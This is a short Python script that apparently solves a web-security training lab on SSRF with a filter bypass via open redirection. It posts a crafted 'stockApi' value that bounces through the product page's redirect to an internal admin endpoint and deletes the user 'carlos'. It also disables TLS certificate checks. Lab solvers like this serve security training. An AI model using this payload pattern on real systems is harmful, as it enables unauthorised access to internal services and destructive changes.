import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SSRF with filter bypass via open redirection vulnerability"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'stockApi' parameter to delete carlos using SSRF via open redirection\n2. Check that carlos doesn't exist anymore in the admin panel\n""")

    print(Fore.WHITE + "Injection point: " + Fore.YELLOW + "stockApi")

    payload = "/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin/delete?username=carlos"
    data =  { "stockApi": payload }

    print(Fore.WHITE + "[+] Injecting payload to delete carlos using SSRF via open redirection")

    try:
        r = requests.post(
            f"{url}/product/stock", data=data, verify=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
